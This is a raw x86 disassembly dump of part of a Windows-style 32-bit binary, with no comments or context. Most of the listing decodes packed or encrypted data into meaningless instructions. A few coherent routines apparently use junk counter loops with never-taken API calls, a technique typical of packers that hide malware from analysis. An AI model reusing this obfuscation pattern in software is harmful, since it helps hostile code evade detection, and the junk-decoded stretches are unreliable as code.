  405a55:	and    eax,0xbc7e6b84
  405a5a:	sbb    DWORD PTR [edi],ebp
  405a5c:	push   ds
  405a5d:	inc    ebp
  405a5e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405a5f:	cdq    
  405a60:	adc    BYTE PTR [ebp-0x36],dh
  405a63:	dec    ebx
  405a64:	mov    ebp,DWORD PTR [ebx+0x7c]
  405a67:	inc    edi
  405a68:	xor    ebp,DWORD PTR [ebx-0x4c]
  405a6b:	ja     0x405a13
  405a6d:	rcl    DWORD PTR [eax],0xe2
  405a70:	(bad)  
  405a71:	nop
  405a72:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405a73:	ja     0x405a1f
  405a75:	loopne 0x405a2e
  405a77:	ret    0x10fb
  405a7a:	push   cs
  405a7b:	pand   mm2,mm4
  405a7e:	mov    ah,0xad
  405a80:	push   cs
  405a81:	pop    ds
  405a82:	(bad)  
  405a83:	inc    ecx
  405a84:	(bad)  
  405a85:	jnp    0x405a0d
  405a87:	in     al,dx
  405a88:	push   cs
  405a89:	clc    
  405a8a:	rol    eax,cl
  405a8c:	neg    DWORD PTR [eax-0x18]
  405a8f:	aam    0x45
  405a91:	cwde   
  405a92:	xchg   esp,eax
  405a93:	cld    
  405a94:	mov    esi,0xded29596
  405a99:	add    bl,cl
  405a9b:	pop    ebx
  405a9c:	and    BYTE PTR [ebx-0x3284ef27],dl
  405aa2:	add    DWORD PTR [si],ebx
  405aa5:	(bad)  
  405aa6:	mov    eax,ds:0xac41faae
  405aab:	ss sub al,0x87
  405aae:	aas    
  405aaf:	fsub   DWORD PTR [esi-0x55ccc839]
  405ab5:	mov    ds:0x2b09be4c,eax
  405aba:	rol    DWORD PTR [edx+0x7f],1
  405abd:	xlat   BYTE PTR ds:[ebx]
  405abe:	cdq    
  405abf:	call   0x75b6795e
  405ac4:	mov    esi,0xc09e155b
  405ac9:	adc    al,0xdb
  405acb:	mov    edx,0x53df49b1
  405ad0:	jge    0x405a83
  405ad2:	data16 jb 0x405b41
  405ad5:	lahf   
  405ad6:	mov    ebp,0xa425a19d
  405adb:	cmc    
  405adc:	fdiv   QWORD PTR [ebx+0x6b857462]
  405ae2:	lahf   
  405ae3:	fmul   st(2),st
  405ae5:	mov    al,ds:0x7ef80a0a
  405aea:	xchg   ebp,eax
  405aeb:	std    
  405aec:	inc    ebx
  405aed:	dec    esp
  405aee:	sub    al,0x4f
  405af0:	fucom  st(5)
  405af2:	cmc    
  405af3:	jecxz  0x405aa7
  405af5:	mov    eax,ds:0x2134f800
  405afa:	outs   dx,BYTE PTR ds:[esi]
  405afb:	addr16 icebp 
  405afd:	fcomp  DWORD PTR [edi-0x69d7fc6e]
  405b03:	inc    ebp
  405b04:	jae    0x405b47
  405b06:	mov    al,ds:0xe728e85c
  405b0b:	sub    al,0x3c
  405b0d:	add    dl,BYTE PTR [esi-0x4676e52]
  405b13:	int3   
  405b14:	mov    ebp,0x8d0a9f5c
  405b19:	repz ds push ecx
  405b1c:	sub    DWORD PTR [edi+ecx*1+0xb],esp
  405b20:	sar    dh,0x1f
  405b23:	aam    0xad
  405b25:	xchg   ebp,eax
  405b26:	je     0x405ad0
  405b28:	sub    ch,BYTE PTR [edi-0x49]
  405b2b:	retf   0x8f1e
  405b2e:	push   0x2237447d
  405b33:	mov    dl,0xfb
  405b35:	fs sti 
  405b37:	int    0x5b
  405b39:	jecxz  0x405b82
  405b3b:	aad    0x5b
  405b3d:	clc    
  405b3e:	xor    bl,BYTE PTR [edx+0x63]
  405b41:	push   0x60
  405b43:	cmp    eax,0xcdc36073
  405b48:	jp     0x405bb5
  405b4a:	xchg   ebp,eax
  405b4b:	(bad)  
  405b4c:	mov    edi,0xd1ac33be
  405b51:	mov    ch,0xb1
  405b53:	imul   eax,DWORD PTR [esi-0x40c82558],0xffffffc0
  405b5a:	xor    DWORD PTR [ebx-0x80],0xa32061dc
  405b61:	push   ds
  405b62:	in     eax,dx
  405b63:	push   ebp
  405b64:	cli    
  405b65:	addr16 pop esp
  405b67:	jl     0x405b85
  405b69:	arpl   WORD PTR [esp+ebp*2+0x63],sp
  405b6d:	aam    0x33
  405b6f:	retf   0xdf15
  405b72:	sti    
  405b73:	in     al,0x90
  405b75:	call   0x8536:0x235b7e66
  405b7c:	cmp    edi,DWORD PTR [eax-0x44]
  405b7f:	imul   ebp,DWORD PTR es:[ebp+0x63],0xffffffef
  405b84:	jo     0x405b3f
  405b86:	push   es
  405b87:	pop    edi
  405b88:	pushf  
  405b89:	stos   DWORD PTR es:[edi],eax
  405b8a:	jle    0x405bb0
  405b8c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405b8d:	out    0x2,eax
  405b8f:	sub    bl,BYTE PTR [edx]
  405b91:	sbb    cl,cl
  405b93:	faddp  st(3),st
  405b95:	push   ebp
  405b96:	repnz mov eax,0xe13b41dc
  405b9c:	cmc    
  405b9d:	xchg   edi,eax
  405b9e:	push   0xe45615a5
  405ba3:	mov    BYTE PTR [ebp-0x551aadef],bh
  405ba9:	shl    BYTE PTR [esi],1
  405bab:	xor    esi,DWORD PTR [ecx-0x50]
  405bae:	ret    
  405baf:	inc    ebp
  405bb0:	sbb    BYTE PTR [ebx],dl
  405bb2:	call   0x7afacaea
  405bb7:	sbb    DWORD PTR [edi-0x11d2f02],0xba30e159
  405bc1:	jb     0x405c05
  405bc3:	sti    
  405bc4:	jne    0x405beb
  405bc6:	pop    esp
  405bc7:	push   0x35
  405bc9:	(bad)  
  405bca:	sbb    al,0x6
  405bcc:	push   edi
  405bcd:	or     esi,DWORD PTR [esi+eax*1-0x35]
  405bd1:	xchg   esp,eax
  405bd2:	ret    0xd85
  405bd5:	push   DWORD PTR [edi-0x4887061d]
  405bdb:	pop    esp
  405bdc:	mov    ds:0x8f3d137c,al
  405be1:	or     esp,DWORD PTR [eax+0x35]
  405be4:	or     eax,0xe1131f83
  405be9:	sub    ebx,ebp
  405beb:	fwait
  405bec:	test   cl,bh
  405bee:	dec    ecx
  405bef:	jecxz  0x405bb3
  405bf1:	sub    BYTE PTR [esp+edx*1],bh
  405bf4:	test   DWORD PTR [eax],eax
  405bf6:	xchg   edi,eax
  405bf7:	xchg   ecx,eax
  405bf8:	push   eax
  405bf9:	or     esp,DWORD PTR [ebp-0x4e9a07a6]
  405bff:	jo     0x405c36
  405c01:	in     al,dx
  405c02:	pop    ebp
  405c03:	inc    ebp
  405c04:	jl     0x405bd8
  405c06:	xor    cl,BYTE PTR [eax+0x3c]
  405c09:	jno    0x405bb8
  405c0b:	or     esi,DWORD PTR [esp+eiz*2]
  405c0e:	ficom  WORD PTR [esi]
  405c10:	add    DWORD PTR [ecx+0xe01b3e],ebx
  405c16:	and    ebp,eax
  405c18:	dec    ebp
  405c19:	shl    DWORD PTR [edx+0x31],cl
  405c1c:	(bad)  
  405c1d:	popf   
  405c1e:	jne    0x405c77
  405c20:	lea    edi,[edx+0x5e6e9867]
  405c26:	xchg   DWORD PTR [eax+0x3c],edi
  405c29:	pop    ebx
  405c2a:	add    BYTE PTR [ebx-0xd],0x7a
  405c2e:	adc    edx,ebp
  405c30:	push   ebp
  405c31:	mov    bh,bl
  405c33:	jno    0x405bb6
  405c35:	ret    0xc834
  405c38:	out    0xf5,eax
  405c3a:	out    dx,eax
  405c3b:	mov    ecx,0x3375eecc
  405c40:	push   ecx
  405c41:	inc    eax
  405c42:	mov    eax,ds:0x5269f34e
  405c47:	push   es
  405c48:	jmp    0x18b:0x67bae7ed
  405c4f:	mov    eax,ds:0x62bef982
  405c54:	add    BYTE PTR [esi+0x608612be],dl
  405c5a:	inc    esp
  405c5b:	mov    ah,0xd0
  405c5d:	mov    bh,0xeb
  405c5f:	fld    TBYTE PTR [edx]
  405c61:	add    al,al
  405c63:	stc    
  405c64:	and    al,0xfb
  405c66:	aaa    
  405c67:	mov    ch,0xb2
  405c69:	push   esp
  405c6a:	xchg   edi,eax
  405c6b:	dec    ebp
  405c6c:	fadd   QWORD PTR [esi+0x28]
  405c6f:	out    dx,eax
  405c70:	mov    ecx,0x552a4a29
  405c75:	in     al,0x46
  405c77:	jmp    0x38b1:0xfde4a6a2
  405c7e:	inc    edx
  405c7f:	mov    edx,0x5c9944e6
  405c84:	loop   0x405c24
  405c86:	(bad)  
  405c88:	push   0x38
  405c8a:	xlat   BYTE PTR ds:[ebx]
  405c8b:	jmp    0x3e2d3a31
  405c90:	mov    al,ds:0x76065693
  405c95:	mov    DWORD PTR [edi-0x4],ecx
  405c98:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405c99:	es aaa 
  405c9b:	outs   dx,DWORD PTR ds:[esi]
  405c9c:	adc    al,0x58
  405c9e:	cmp    edi,edi
  405ca0:	fild   DWORD PTR [edx+0x2a0646ff]
  405ca6:	inc    esp
  405ca7:	dec    eax
  405ca8:	mov    cl,0x5a
  405caa:	fs cmp eax,0x2bb04d7b
  405cb0:	push   esp
  405cb1:	jnp    0x405c88
  405cb3:	push   ebx
  405cb4:	mov    ecx,0xa62cab7d
  405cb9:	cwde   
  405cba:	inc    edi
  405cbb:	mov    ds:0xf5c6639c,eax
  405cc0:	mov    cl,0x6b
  405cc2:	(bad)  
  405cc3:	cmp    al,0x74
  405cc5:	xor    eax,0x3b11da54
  405cca:	enter  0x850f,0x12
  405cce:	add    al,0x0
  405cd0:	add    BYTE PTR [ecx],al
  405cd2:	adc    eax,0x43453f
  405cd7:	mov    ax,WORD PTR [ebp-0x8]
  405cdb:	and    DWORD PTR ds:0x434553,0x43457b
  405ce5:	mov    ecx,0x8a38
  405cea:	sub    DWORD PTR ds:0x43460f,0x30d0
  405cf4:	xor    ax,cx
  405cf7:	or     ecx,0x3ba0
  405cfd:	mov    ecx,0x3afe
  405d02:	and    DWORD PTR ds:0x4345c7,0x6a78
  405d0c:	add    ax,cx
  405d0f:	mov    DWORD PTR ds:0x434547,0x12
  405d19:	cmp    DWORD PTR ds:0x434547,0x0
  405d20:	je     0x405d51
  405d26:	cmp    DWORD PTR ds:0x434547,0x13
  405d2d:	jne    0x405d3f
  405d33:	push   DWORD PTR [ebp-0x1c]
  405d36:	push   DWORD PTR [ebp-0x10]
  405d39:	call   DWORD PTR ds:0x413284
  405d3f:	mov    ecx,DWORD PTR ds:0x434547
  405d45:	dec    ecx
  405d46:	mov    DWORD PTR ds:0x434547,ecx
  405d4c:	jmp    0x405d19
  405d51:	mov    ecx,DWORD PTR [ebp+0x8]
  405d54:	movzx  eax,ax
  405d57:	not    eax
  405d59:	and    eax,DWORD PTR [ecx]
  405d5b:	mov    ecx,DWORD PTR [ebp+0x8]
  405d5e:	mov    DWORD PTR [ecx],eax
  405d60:	jmp    0x405d6c
  405d65:	xor    DWORD PTR [ebp-0x4],0xe149ebf
  405d6c:	mov    ax,WORD PTR [ebp-0x8]
  405d70:	push   DWORD PTR [ebp+0x8]
  405d73:	call   0x4060e7
  405d78:	test   eax,eax
  405d7a:	jmp    0x4060dd
  405d7f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405d80:	jb     0x405db6
  405d82:	push   ebp
  405d83:	cld    
  405d84:	pop    ebp
  405d85:	gs jae 0x405d28
  405d88:	call   0x26441bd6
  405d8d:	add    al,0xf1
  405d8f:	mov    ch,0x3c
  405d91:	jle    0x405e11
  405d93:	les    edi,FWORD PTR [ecx+0x7e]
  405d96:	jle    0x405d2e
  405d98:	retf   0xad92
  405d9b:	aad    0x1d
  405d9d:	xor    al,0x6f
  405d9f:	or     dl,BYTE PTR [ecx+0x66ec7f9d]
  405da5:	add    esi,DWORD PTR [eax]
  405da7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405da8:	xlat   BYTE PTR ds:[ebx]
  405da9:	ror    BYTE PTR [esi+ebp*4+0x6c],0x4b
  405dae:	inc    eax
  405daf:	sub    edi,DWORD PTR [ebx-0x55]
  405db2:	fidivr DWORD PTR [esi-0x458b0c1]
  405db8:	cdq    
  405db9:	or     esi,ebp
  405dbb:	pop    esi
  405dbc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405dbd:	ss das 
  405dbf:	mov    eax,ds:0xfe93aa62
  405dc4:	inc    ecx
  405dc5:	repnz or al,0xd3
  405dc8:	jne    0x405df0
  405dca:	lods   al,BYTE PTR ds:[esi]
  405dcb:	or     ch,BYTE PTR [edi]
  405dcd:	pop    ebx
  405dce:	imul   ecx,DWORD PTR [ebx+0x7b674544],0x37
  405dd5:	or     al,0xa9
  405dd7:	pop    ebp
  405dd8:	add    ebp,DWORD PTR [eax+eax*2+0x6a6a0ecd]
  405ddf:	xor    DWORD PTR [ecx-0x261e76d1],eax
  405de5:	sbb    ch,BYTE PTR [ebx+0x71]
  405de8:	setnp  BYTE PTR [ebx+0x74]
  405dec:	jo     0x405dbc
  405dee:	test   eax,0x12a6591f
  405df3:	dec    ebx
  405df4:	aad    0x7c
  405df6:	pop    ebp
  405df7:	in     eax,dx
  405df8:	sub    dl,dl
  405dfa:	outs   dx,BYTE PTR ds:[esi]
  405dfb:	mov    bl,0x79
  405dfd:	popa   
  405dfe:	popf   
  405dff:	call   0x1ba1:0xabeabe8c
  405e06:	repz das 
  405e08:	fsubr  DWORD PTR [ebp-0x4]
  405e0b:	xchg   DWORD PTR [ebx+0x55db05a7],esi
  405e11:	add    ebx,ecx
  405e13:	xor    DWORD PTR [ecx],eax
  405e15:	xor    esi,DWORD PTR [esi+edi*8-0x27d3c2c1]
  405e1c:	add    al,BYTE PTR [esp+edx*1+0x6b579951]
  405e23:	push   0xffffff9e
  405e25:	in     al,dx
  405e26:	psllq  mm1,QWORD PTR [ecx+0x637b56ae]
  405e2d:	arpl   ax,ax
  405e2f:	and    eax,0x855e4d54
  405e34:	pusha  
  405e35:	fcmovu st,st(1)
  405e37:	xchg   ecx,eax
  405e38:	xchg   ebx,eax
  405e39:	xchg   edi,eax
  405e3a:	out    0x9,eax
  405e3c:	fisub  WORD PTR [edx-0x3b0b70]
  405e42:	jle    0x405e8f
  405e44:	loopne 0x405e45
  405e46:	repnz push edx
  405e48:	mov    ds:0xee5c098,eax
  405e4d:	pushf  
  405e4e:	adc    ecx,DWORD PTR [eax]
  405e50:	mov    esp,0x2c5533eb
  405e55:	push   es
  405e56:	out    0x1f,eax
  405e58:	neg    DWORD PTR [edx]
  405e5a:	jmp    0x8841548d
  405e5f:	js     0x405e4b
  405e61:	sub    BYTE PTR [eax+0x64],cl
  405e64:	imul   esp,DWORD PTR [edx],0x7e
  405e67:	mov    edx,0x567a43ee
  405e6c:	lods   eax,DWORD PTR ds:[esi]
  405e6d:	add    al,0x7f
  405e6f:	fstp   QWORD PTR [eax+0x3d]
  405e72:	popf   
  405e73:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405e74:	imul   edx,DWORD PTR [ecx+0x30480201],0xe61e4208
  405e7e:	pop    eax
  405e7f:	lahf   
  405e80:	(bad)  
  405e83:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405e84:	daa    
  405e85:	leave  
  405e86:	xchg   esp,eax
  405e87:	loop   0x405e25
  405e89:	add    eax,ebx
  405e8b:	jle    0x405ed6
  405e8d:	retf   
  405e8e:	push   0x4a
  405e90:	or     edi,edx
  405e92:	mov    ah,0xfc
  405e94:	and    al,0x22
  405e96:	mov    al,BYTE PTR [edi-0x26cdb90a]
  405e9c:	or     bl,ah
  405e9e:	imul   ecx,DWORD PTR [edx-0x7c9fbd2c],0x789b19ea
  405ea8:	pop    ebx
  405ea9:	adc    al,0xcd
  405eab:	(bad)
  405eae:	fcmovnu st,st(5)
  405eb0:	adc    cl,BYTE PTR [esi+0x5229fe7f]
  405eb6:	fnstcw WORD PTR [eax]
  405eb8:	mov    WORD PTR [ecx],ss
  405eba:	pop    edx
  405ebb:	push   edx
  405ebc:	mov    dl,0xd1
  405ebe:	xor    DWORD PTR [esi],0x6e8cb7fc
  405ec4:	repnz mov esp,0xd2a4ab87
  405eca:	loopne 0x405e9d
  405ecc:	jp     0x405e93
  405ece:	mov    ebp,0x438c255c
  405ed3:	imul   ebx,DWORD PTR [ebp-0x1b36b13c],0xffffffb5
  405eda:	cmp    al,0x33
  405edc:	xor    edi,DWORD PTR [edi-0x2d4f59e4]
  405ee2:	push   esp
  405ee3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405ee4:	push   edi
  405ee5:	cwde   
  405ee6:	add    BYTE PTR [eax+eax*4],ah
  405ee9:	in     al,dx
  405eea:	sub    ah,0xb8
  405eed:	cmp    BYTE PTR [ebp+0x42a5553f],bh
  405ef3:	test   al,0x86
  405ef5:	in     al,0x70
  405ef7:	adc    BYTE PTR [ecx+0x13b4bda0],ch
  405efd:	fisttp WORD PTR [ebp-0x5819fb77]
  405f03:	mov    BYTE PTR [esi-0x429edad0],bh
  405f09:	push   esi
  405f0a:	sbb    al,0x49
  405f0c:	pop    eax
  405f0d:	push   esp
  405f0e:	adc    ebp,eax
  405f10:	popa   
  405f11:	cwde   
  405f12:	add    al,0x33
  405f14:	and    ah,BYTE PTR [edx-0x2]
  405f17:	xor    al,0xd
  405f19:	aam    0xa9
  405f1b:	inc    eax
  405f1c:	mov    ebx,0xd65f4674
  405f21:	icebp  
  405f22:	xchg   ebp,eax
  405f23:	jg     0x405f01
  405f25:	aad    0xa9
  405f27:	pop    esi
  405f28:	sbb    eax,0x25fb885e
  405f2d:	or     ecx,edx
  405f2f:	xor    eax,DWORD PTR [edi]
  405f31:	mov    BYTE PTR [ebx+0x365f0ec8],al
  405f37:	pop    edx
  405f38:	into   
  405f39:	lds    edi,FWORD PTR [ecx+edi*4+0x1250712b]
  405f40:	lds    edx,FWORD PTR [ebx+0x5addc12b]
  405f46:	iret   
  405f47:	js     0x405f96
  405f49:	cli    
  405f4a:	adc    al,0x96
  405f4c:	scas   al,BYTE PTR es:[edi]
  405f4d:	mov    DWORD PTR [ecx+0x728d3dad],esi
  405f53:	mov    ecx,0xe28174e6
  405f58:	and    al,0xc2
  405f5a:	xor    DWORD PTR [edx+eax*2-0x6a],eax
  405f5e:	clc    
  405f5f:	fsub   DWORD PTR [ecx+edx*2]
  405f62:	cmc    
  405f63:	fnstcw WORD PTR ds:0xd46067e5
  405f69:	test   DWORD PTR [edx],0x2b751d4a
  405f6f:	pusha  
  405f70:	out    dx,eax
  405f71:	(bad)  
  405f72:	cwde   
  405f73:	jbe    0x405f47
  405f75:	mov    ah,0x82
  405f77:	pop    esi
  405f78:	pop    esp
  405f79:	(bad)  
  405f7a:	mov    ebx,ebx
  405f7c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405f7d:	dec    ecx
  405f7e:	pop    ebx
  405f7f:	cdq    
  405f80:	mov    WORD PTR [ebx+0x7a],ds
  405f83:	push   cs
  405f84:	xor    DWORD PTR [ebp-0x54],eax
  405f87:	stos   DWORD PTR es:[edi],eax
  405f88:	xor    DWORD PTR [ecx+0x5e4a43da],eax
  405f8e:	cs push 0x4ff3fa16
  405f94:	repz fadd DWORD PTR cs:[esi]
  405f98:	neg    BYTE PTR [esi]
  405f9a:	imul   ecx,DWORD PTR [ecx+0x13a40378],0x38
  405fa1:	cld    
  405fa2:	je     0x405f96
  405fa4:	adc    ch,BYTE PTR [eax]
  405fa6:	and    DWORD PTR [edx-0x117f2670],ecx
  405fac:	or     bl,BYTE PTR [ebp+0x5]
  405faf:	push   ebx
  405fb0:	xor    ecx,DWORD PTR [edx]
  405fb2:	push   0x61
  405fb4:	xchg   DWORD PTR [esi+0x63527fc9],edx
  405fba:	rep lods al,BYTE PTR ds:[esi]
  405fbc:	call   0xd715:0x48952f6b
  405fc3:	sahf   
  405fc4:	adc    DWORD PTR [esi-0xe],esp
  405fc7:	js     0x405f5f
  405fc9:	mov    eax,0xf89da11b
  405fce:	push   ebx
  405fcf:	add    ch,BYTE PTR [ecx-0x1c08a716]
  405fd5:	clc    
  405fd6:	inc    esi
  405fd7:	inc    edi
  405fd8:	jns    0x406012
  405fda:	iretw  
  405fdc:	and    dl,BYTE PTR [edi-0x567c6397]
  405fe2:	clc    
  405fe3:	js     0x405fb9
  405fe5:	lods   al,BYTE PTR ds:[esi]
  405fe6:	scas   eax,DWORD PTR es:[edi]
  405fe7:	popf   
  405fe8:	pop    es
  405fe9:	cmp    esi,DWORD PTR [edx+0x66c6aaef]
  405fef:	out    0xca,eax
  405ff1:	xor    eax,0x2eee05b4
  405ff6:	mov    ebx,0x450cfca0
  405ffb:	lahf   
  405ffc:	test   bl,ch
  405ffe:	gs inc ebp
  406000:	adc    DWORD PTR [eax+eiz*8-0x2cac84ab],0x77ade1ce
  40600b:	(bad)  
  40600c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40600d:	int3   
  40600e:	ins    DWORD PTR es:[edi],dx
  40600f:	push   es
  406010:	repnz push esp
  406012:	lods   eax,DWORD PTR ds:[esi]
  406013:	mov    eax,ds:0xda3be86c
  406018:	popf   
  406019:	arpl   WORD PTR ds:[edi],sp
  40601c:	pop    ebp
  40601d:	repnz xor al,0xca
  406020:	pusha  
  406021:	push   esp
  406022:	frstor [edi-0x10f2deaa]
  406028:	(bad)  
  40602a:	shl    DWORD PTR [ebp-0x5a5f6d30],1
  406030:	out    dx,eax
  406031:	jo     0x406090
  406033:	ins    BYTE PTR es:[edi],dx
  406034:	(bad)  
  406035:	in     eax,0x5
  406037:	push   0xc6ad7a67
  40603c:	mov    dh,0x29
  40603e:	jb     0x40609d
  406040:	adc    BYTE PTR [esi-0x68],0xca
  406044:	cmp    DWORD PTR [ebp+esi*2-0x12d5ec23],esp
  40604b:	ss jl  0x4060c3
  40604e:	add    BYTE PTR [eax],al
  406050:	shl    ebp,0x82
  406053:	or     eax,0xb060a493
  406058:	inc    ebx
  406059:	push   edx
  40605a:	cld    
  40605b:	(bad)  
  40605c:	mov    bl,0x8a
  40605e:	in     eax,dx
  40605f:	add    edi,DWORD PTR [esi-0x1fd4e127]
  406065:	xchg   ecx,edx
  406067:	jle    0x406035
  406069:	push   eax
  40606a:	iret   
  40606b:	sbb    DWORD PTR ds:0xb49de4ff,0xd6b3b1bf
  406075:	mov    ebp,0x51ece488
  40607a:	jb     0x406014
  40607c:	dec    edi
  40607d:	xchg   edx,esi
  40607f:	push   ebx
  406080:	xor    ch,bh
  406082:	push   0xffffffd7
  406084:	xlat   BYTE PTR ds:[ebx]
  406085:	mov    edi,0xf16b9608
  40608a:	mov    cl,0x81
  40608c:	in     al,0xbf
  40608e:	cdq    
  40608f:	inc    edx
  406090:	jmp    0x4060c1
  406092:	repz neg BYTE PTR [eax]
  406095:	pushf  
  406096:	clc    
  406097:	nop
  406098:	adc    bh,al
  40609a:	fldcw  WORD PTR [ecx+0x70]
  40609d:	jle    0x406074
  40609f:	sbb    DWORD PTR [esi],esi
  4060a1:	xchg   ebx,eax
  4060a2:	enter  0x4b52,0x25
  4060a6:	or     ecx,edx
  4060a8:	out    0x41,eax
  4060aa:	gs and eax,0x5dd5a95a
  4060b0:	sub    DWORD PTR [ebx],edi
  4060b2:	dec    ecx
  4060b3:	mov    ds:0x93829c84,al
  4060b8:	pop    ebx
  4060b9:	cs dec esi
  4060bb:	shl    dh,1
  4060bd:	add    esp,DWORD PTR ds:[esi+0x37]
  4060c1:	test   ebx,ebx
  4060c3:	rcl    ecx,0x1
  4060c6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4060c7:	push   ds
  4060c8:	cmp    eax,0x5af6957e
  4060cd:	adc    ah,BYTE PTR [ecx+0x5e90b76c]
  4060d3:	shl    DWORD PTR [eax+eiz*8-0x64],1
  4060d7:	fldenv [esi-0x264c4e6c]
  4060dd:	je     0x405d65
  4060e3:	leave  
  4060e4:	ret    0x4
  4060e7:	push   ebp
  4060e8:	mov    ebp,esp
  4060ea:	sub    esp,0x2c
  4060ed:	mov    DWORD PTR [ebp-0x8],0xf89c8539
  4060f4:	mov    DWORD PTR [ebp-0x14],0xf89c8536
  4060fb:	mov    ecx,DWORD PTR ds:0x43456f
  406101:	mov    eax,ds:0x43461b
  406106:	sub    eax,ecx
  406108:	add    ecx,DWORD PTR [ecx+eax*1]
  40610b:	mov    eax,0x9577
  406110:	and    DWORD PTR ds:0x434553,0x0
  40611a:	jmp    0x40612c
  40611f:	mov    ecx,DWORD PTR ds:0x434553
  406125:	inc    ecx
  406126:	mov    DWORD PTR ds:0x434553,ecx
  40612c:	cmp    DWORD PTR ds:0x434553,0x15
  406133:	jae    0x40615a
  406139:	cmp    DWORD PTR ds:0x434553,0x17
  406140:	jne    0x40614f
  406146:	push   DWORD PTR [ebp-0x10]
  406149:	call   DWORD PTR ds:0x4130c0
  40614f:	jmp    0x40611f
  406154:	adc    DWORD PTR ds:0x434537,edx
  40615a:	mov    WORD PTR [ebp-0x4],ax
  40615e:	and    DWORD PTR ds:0x43457b,0x0
  406168:	mov    ecx,DWORD PTR ds:0x43457b
  40616e:	inc    ecx
  40616f:	mov    DWORD PTR ds:0x43457b,ecx
  406175:	cmp    DWORD PTR ds:0x43457b,0x5
  40617c:	jne    0x40618b
  406182:	push   DWORD PTR [ebp-0x10]
  406185:	call   DWORD PTR ds:0x4133fc
  40618b:	cmp    DWORD PTR ds:0x43457b,0x4
  406192:	jne    0x4061a7
  406198:	xor    ecx,ecx
  40619a:	or     ecx,DWORD PTR ds:0x43457b
  4061a0:	inc    ecx
  4061a1:	mov    DWORD PTR ds:0x43457b,ecx
  4061a7:	cmp    DWORD PTR ds:0x43457b,0x1f
  4061ae:	jb     0x406168
  4061b4:	jmp    0x4065a2
  4061b9:	and    bl,al
  4061bb:	ss cmp ch,bh
  4061be:	cmc    
  4061bf:	lock jecxz 0x406145
  4061c2:	sahf   
  4061c3:	rol    ebp,1
  4061c5:	inc    edi
  4061c6:	push   edx
  4061c7:	hlt    
  4061c8:	nop
  4061c9:	jae    0x40620a
  4061cb:	jle    0x40624b
  4061cd:	dec    edi
  4061ce:	jns    0x40624e
  4061d0:	jle    0x4061bf
  4061d2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4061d3:	add    bl,BYTE PTR [edx+eax*1-0x601944bc]
  4061da:	pop    es
  4061db:	cmp    esp,esp
  4061dd:	jbe    0x406217
  4061df:	xchg   edx,eax
  4061e0:	dec    esi
  4061e1:	fwait
  4061e2:	sti    
  4061e3:	mov    bl,0xfa
  4061e5:	push   esp
  4061e6:	adc    DWORD PTR [ebx+0x1f],ecx
  4061e9:	aad    0x26
  4061eb:	outs   dx,BYTE PTR ds:[esi]
  4061ec:	fld    DWORD PTR [edx+0x3]
  4061ef:	cmp    ebp,esp
  4061f1:	shl    DWORD PTR [edi+edi*1+0x33bb194e],cl
  4061f8:	pop    eax
  4061f9:	pop    ebp
  4061fa:	pop    edi
  4061fc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4061fd:	jno    0x406201
  4061ff:	pop    esp
  406200:	dec    esp
  406201:	lds    esp,FWORD PTR [edx]
  406203:	add    edi,DWORD PTR [ecx-0x6ec46935]
  406209:	push   es
  40620a:	fisttp DWORD PTR [eax+0x7f762b57]
  406210:	cmp    eax,0x237a5b62
  406215:	jge    0x406214
  406217:	movs   BYTE PTR es:[edi],BYTE PTR es:[esi]
  406219:	(bad)  
  40621a:	out    0x11,eax
  40621c:	les    edi,FWORD PTR [ecx-0x8]
  40621f:	pop    ds
  406220:	(bad)  
  406221:	scas   eax,DWORD PTR es:[edi]
  406222:	jo     0x40621d
  406224:	mov    bl,BYTE PTR [edx-0x78a650d3]
  40622a:	pop    ecx
  40622b:	sub    al,0x78
  40622d:	pop    esi
  40622e:	nop
  40622f:	mov    ebx,DWORD PTR [edx+edi*4+0xcdccffa]
  406236:	push   esp
  406237:	and    eax,0x66f8874
  40623c:	test   DWORD PTR [ebx],ebx
  40623e:	xchg   esi,eax
  40623f:	mov    ch,0x23
  406241:	cmp    eax,0x44b98ccf
  406246:	std    
  406247:	or     al,dl
  406249:	xchg   edi,eax
  40624a:	xchg   ebp,eax
  40624b:	not    DWORD PTR [edx+0xf]
  40624e:	stos   DWORD PTR es:[edi],eax
  40624f:	mov    eax,0xad6ac158
  406254:	pop    edx
  406255:	jmp    0x9236:0x7b24b561
  40625c:	inc    ebx
  40625d:	dec    edx
  40625e:	xchg   edx,eax
  40625f:	mov    ebx,0xb50daac2
  406264:	pop    ebx
  406265:	xor    BYTE PTR [edi],0x72
  406268:	jmp    0x40623d
  40626a:	fwait
  40626b:	nop
  40626c:	sbb    DWORD PTR [ebp-0x59],edi
  40626f:	aaa    
  406270:	inc    edx
  406271:	stc    
  406272:	pop    ecx
  406273:	mov    al,ds:0xace70d75
  406278:	mov    ecx,0x2b7c136c
  40627d:	cmp    eax,0x30a668fe
  406282:	pop    eax
  406283:	adc    DWORD PTR [ebx],esi
  406285:	ret    0x720d
  406288:	adc    eax,0xa33c1073
  40628d:	fnstsw WORD PTR [ecx+0x3]
  406290:	pushf  
  406291:	mov    bh,0xf0
  406293:	in     al,dx
  406294:	(bad)  
  406295:	mov    cl,0x5
  406297:	lds    eax,FWORD PTR [ecx]
  406299:	neg    edx
  40629b:	jmp    0xd2eb:0x4ef58a63
  4062a2:	jno    0x406277
  4062a4:	adc    BYTE PTR [edx+edi*2+0x41c884be],0xfe
  4062ac:	leave  
  4062ad:	aaa    
  4062ae:	inc    ecx
  4062af:	push   ebx
  4062b0:	cdq    
  4062b1:	popf   
  4062b2:	xor    DWORD PTR [ebp+ebp*2-0x60],ebp
  4062b6:	cld    
  4062b7:	dec    ecx
  4062b8:	mov    ebp,0x6edc6031
  4062bd:	or     ebx,edi
  4062bf:	push   ss
  4062c0:	in     eax,dx
